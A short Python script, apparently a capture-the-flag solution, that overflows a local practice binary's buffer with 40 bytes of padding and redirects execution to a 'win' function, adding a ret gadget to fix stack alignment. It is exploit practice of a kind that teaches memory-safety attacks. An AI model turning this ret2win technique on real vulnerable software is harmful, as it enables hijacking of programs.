import subprocess

TARGET = "../chals/02-stack-align/chal"
OFFSET = 40
WIN    = 0x4011b6
RET    = 0x40101a

def run(payload):
    r = subprocess.run([TARGET], input=payload, capture_output=True)
    return r.returncode, r.stdout.decode(errors="replace").strip()

p1 = b"A" * OFFSET + WIN.to_bytes(8, "little")
p2 = b"A" * OFFSET + RET.to_bytes(8, "little") + WIN.to_bytes(8, "little")
print("[直接跳]", run(p1))
print("[加gadget]", run(p2))
